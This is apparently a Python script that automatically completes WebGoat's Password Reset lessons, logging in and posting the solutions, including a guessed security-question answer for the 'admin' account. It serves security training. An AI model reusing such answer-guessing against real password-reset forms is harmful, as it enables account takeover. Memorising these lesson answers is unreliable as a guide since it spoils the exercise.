import requests

HOST_IP = "__HOST_IP__"
USERNAME = "__USERNAME__"
PASSWORD = "__PASSWORD__"
BASE_URL = f"http://{HOST_IP}:8080/WebGoat"
PASS_RESET_SIMPLE_MAIL = f"{BASE_URL}/PasswordReset/simple-mail"
PASS_RESET_SEC_QUESTIONS = f"{BASE_URL}/PasswordReset/questions"
PASS_RESET_PROBLEM_SEC_QUESTIONS = f"{BASE_URL}/PasswordReset/SecurityQuestions"

def create_session():
    """Creates a session for authentication."""
    s = requests.Session()
    s.headers.update({
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Host": f"{HOST_IP}:8080",
        "Origin": BASE_URL,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    })
    return s


def login(session):
    """Logs in using the provided session."""
    login_url = f"{BASE_URL}/login"
    r = session.post(login_url, data={"username": USERNAME, "password": PASSWORD})
    if r.status_code != 200:
        print(f"Error: Login failed. Status code: {r.status_code}")
        print(f"Response: {r.text}")
        exit(1)


def load_resources(session):
    """Loads necessary resources for the WebGoat lessons."""
    resources = [
            "welcome.mvc", "start.mvc", "service/labels.mvc", "service/lessonmenu.mvc", "service/lessonoverview.mvc", "WebGoatIntroduction.lesson.lesson", "PasswordReset.lesson.lesson"]

    for resource in resources:
        r = session.get(f"{BASE_URL}/{resource}")
        if r.status_code != 200:
            print(f"Error: Failed to load {resource}. Status code: {r.status_code}")
            exit(1)


def pass_reset_email_functionaity(session):
    """Password Reset Email functionality with WebWolf lesson."""
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/start.mvc",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"email": USERNAME, "password": USERNAME[::-1]}
    r = session.post(PASS_RESET_SIMPLE_MAIL, headers=headers, data=data, verify=False)
    print(f"Email functionality with WebWolf Response: {r.text}")


def pass_reset_sec_questions(session):
    """Password Reset Securty questions."""
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/start.mvc",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"username": "admin", "securityQuestion": "green"}
    r = session.post(PASS_RESET_SEC_QUESTIONS, headers=headers, data=data, verify=False)
    print(f"Security questions response: {r.text}")


def pass_reset_problem_sec_questions(session):
    """Password Reset The Problem with Security Questions."""
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/start.mvc",
        "X-Requested-With": "XMLHttpRequest",
    }
    # The assignment needs two selected questions to be marked as complete
    data = {"question": "What is your favorite color?"}
    r = session.post(PASS_RESET_PROBLEM_SEC_QUESTIONS, headers=headers, data=data, verify=False)
    print(f"The Problem with Security Questions first response: {r.text}")

    data = {"question": "What was the time you were born?"}
    r = session.post(PASS_RESET_PROBLEM_SEC_QUESTIONS, headers=headers, data=data, verify=False)
    print(f"The Problem with Security Questions second response: {r.text}")


def main():
    session = create_session()
    login(session)
    load_resources(session)

    pass_reset_email_functionaity(session)
    pass_reset_sec_questions(session)
    pass_reset_problem_sec_questions(session)


if __name__ == "__main__":
    main()

